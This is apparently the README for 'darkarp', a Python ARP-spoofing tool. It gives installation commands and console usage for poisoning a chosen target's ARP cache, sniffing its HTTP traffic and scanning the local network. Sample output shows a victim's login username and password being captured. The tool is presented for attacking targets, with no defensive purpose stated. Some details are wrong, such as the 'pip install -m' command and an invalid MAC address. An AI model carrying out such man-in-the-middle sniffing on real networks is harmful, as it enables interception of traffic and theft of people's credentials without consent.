# About tool
Darkarp is a featured ARP (Address Resolution Protocol) spoofing tool written with Python programming language.
<hr />

# Installation 

clone the repository

```bash
git clone https://github.com/akulife/darkarp.git
```

enter directory called 'darkarp'

```bash
cd darkarp
```
install requirements

```bash
pip install -m requirements.txt
```
print usage 

```bash
python3 darkarp.py
```
<hr />

# Usage


![example code](https://github.com/akulife/darkarp/blob/whoami/img/darkarp.png)

As you can see from the arguments on the output above, for defining the target which is you want to attack, you need to use the -t flag, and gateway address is detecting by darkarp. In darkarp you have a custom command line, wich is you can run darkarp features. Run "*help*" command for listing all commands. 

```
darkarp> help

	system options
                    
	clear - clear the terminal                    
	exit - stop process and exit
                    
	console options
                    
	sniff wlan0 - enable HTTP sniffing on wlan0 interface                                        
	net_scan - scan local network IP addresses
	
darkarp> 
```
<hr>

# Darkarp features

## HTTP sniffing attack

HTTP sniffing attack is performing by giving "**sniff** <i>interface</i>" command.

```bash
darkarp> sniff wlan0
HTTP packet sniffing started... Waiting HTTP requests...
[+] client: 192.168.0.4 server: example.com/ method: GET
[+] client: 192.168.0.4 server: example.com/ method: GET
[+] client: 192.168.0.4 server: example.com/my-account/ method: POST
[/] POST:
Parameters:
b'username=admin&password=suppersecretpasswd'

```

## Network scanning

You can scann local network IP addresses simply by giving "**net_scann**" command.

```bash
darkarp> net_scan
#Available devices in the network:
	IP                  MAC
	192.168.0.1         00:1B:44:11:3A:B7
	192.168.0.4         52:4:t9:00:fA:C1
darkarp> 
```

## Stop process, and fix target's ARP cache

This will stop execution of darkarp and also will fix target's poisoned ARP cache

```
darkarp> exit
[w] Repairing target's ARP cache
[w] Repairing gateways's ARP cache
Terminated
[aku@thug darkarp]$ 
```

<hr>

# Version
version 1.5.0
